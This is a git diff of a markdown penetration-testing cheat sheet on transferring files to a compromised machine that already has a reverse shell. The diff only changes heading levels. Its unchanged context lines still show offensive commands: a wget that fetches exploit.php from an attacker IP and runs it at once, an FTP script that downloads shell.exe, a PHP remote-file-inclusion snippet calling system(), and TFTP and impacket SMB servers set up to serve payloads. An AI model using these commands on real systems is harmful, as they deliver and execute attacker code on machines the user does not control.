@@ -8,7 +8,7 @@ classes:
 
 Tranfer files to the target machine is particularly useful when we have already had a reverse shell on Windows. Windows does not have convenient commands to download files such as wget in Linux.
 
-# If PHP RFI is available
+## If PHP RFI is available
 Use PHP base64_decode
 ```php
 <?php
@@ -21,18 +21,18 @@ echo system("ls -la /tmp");
 ?>
 ```
 
-# To Linux machine
+## To Linux machine
 Use wget
 ```
 cd /tmp && wget -O exploit.php 10.11.0.105/exploit.php && php -f exploit.php
 ```
 
-# To Windows machine
-## HTTP Server
+## To Windows machine
+### HTTP Server
 ```
 python -m SimpleHTTPServer 80
 ```
-## FTP Server
+### FTP Server
 To start Python FTP server:
 ```
 apt-get install python-pyftpdlib  
@@ -48,7 +48,7 @@ echo get shell.exe>>ftp.txt
 echo bye>>ftp.txt
 ftp -s:ftp.txt
 ```
-## TFTP Server
+### TFTP Server
 To start Kali TFTP server:
 ```
 service atftpd start
@@ -62,7 +62,7 @@ If tftp is not available:
 ```
 pkgmgr /iu:"TFTP"  
 ```
-## SMB Server
+### SMB Server
 To start SMB server:
 ```
 python /opt/impacket/examples/smbserver.py ROPNOP /root/
